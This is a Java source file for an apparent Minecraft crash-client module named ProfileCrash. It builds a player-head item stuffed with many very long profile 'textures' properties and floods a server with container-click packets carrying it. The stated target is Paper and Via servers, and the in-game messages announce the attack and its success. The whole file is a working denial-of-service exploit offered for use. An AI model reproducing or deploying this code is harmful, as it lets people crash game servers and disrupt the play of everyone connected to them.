package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataProfile;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

public class ProfileCrash extends Module {
	private ScheduledExecutorService executorService;

	public ProfileCrash() {
		super("Profile", "Player head profile properties bomb (Paper / Via Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "100");
		addArgument("propCount", ArgumentType.INT, 1, 4096, "64");
		addArgument("propLength", ArgumentType.INT, 1, 2096000, "8192");
		addArgument("map size", ArgumentType.INT, 1, 46, "16");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "1");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int propCount = context.getInt("propCount");
		int propLength = context.getInt("propLength");
		int mapSize = context.getInt("map size");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		setEnabled(true);

		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.FULL_ITEM_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
			return;
		}

		String value = "A".repeat(propLength);
		List<DataProfile.Property> properties = new ArrayList<>(propCount);
		for (int i = 0; i < propCount; i++) {
			properties.add(new DataProfile.Property("textures", value));
		}

		DataComponents components = new DataComponents();
		components.put(new DataProfile("DannyBomb", UUID.nameUUIDFromBytes("dannycrasher".getBytes()), properties));
		ItemStack stack = new ItemStack(ItemType.PLAYER_HEAD.getId(protocol), 1, components);

		Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
		for (int j = 0; j < mapSize; ++j) {
			int2objectmap.put(j, stack);
		}

		context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

		AtomicInteger check = new AtomicInteger(0);
		executorService = Executors.newSingleThreadScheduledExecutor();
		Runnable clickTask = () -> {
			if (!isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
					|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
				executorService.shutdown();
				setEnabled(false);
				if (Minecraft.getInstance().getConnection() != null) {
					context.sendMessage("Attack <green>successful <white>finished!");
				}
			} else {
				PacketCodec.sendPacket(new PacketContainerClick(
								protocol,
								0,
								1,
								10,
								PacketContainerClick.ContainerActionType.CLICK_ITEM,
								PacketContainerClick.ContainerAction.RIGHT_CLICK,
								stack,
								int2objectmap),
						packets);
			}

			check.getAndIncrement();
		};
		executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		if (executorService != null) {
			executorService.shutdownNow();
		}
	}
}
